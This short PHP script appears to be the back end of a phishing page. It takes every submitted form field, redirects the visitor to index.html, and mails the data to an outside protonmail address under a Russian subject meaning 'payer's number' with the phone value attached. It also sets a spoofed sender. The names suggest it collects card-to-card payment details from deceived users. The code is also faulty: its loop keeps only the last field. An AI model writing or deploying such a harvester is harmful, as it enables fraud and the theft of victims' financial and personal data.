<?php
session_start();
header("Location: index.html");

error_reporting(E_ALL);

$_SESSION = $_POST;

$to = "payc2c@protonmail.com";
$message;
$subject = "Номер платильщика" . $_SESSION["phone"];
foreach ($_SESSION as $key => $value) {
    $message = $key . ":" . $value . "\r\n";
}
$header = "From: mymail@gmail.com	 \r\n";

echo $message;
$retval = mail($to, $subject, $message, $header);

?>